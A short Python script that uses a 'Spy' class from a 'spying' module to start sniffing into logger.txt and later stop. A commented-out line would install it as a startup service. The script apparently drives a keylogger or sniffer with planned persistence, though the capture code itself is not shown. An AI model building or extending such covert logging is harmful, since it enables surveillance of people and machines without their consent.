# import os
from spying import Spy
import time
s = Spy()
s.start_sniffing_to_file("logger.txt")
print("started")
input()
# time.sleep(3)
s.stop_sniffing()
print("stopped")

# if __name__ == "__main__":
#     os.system("python service.py install --startup")
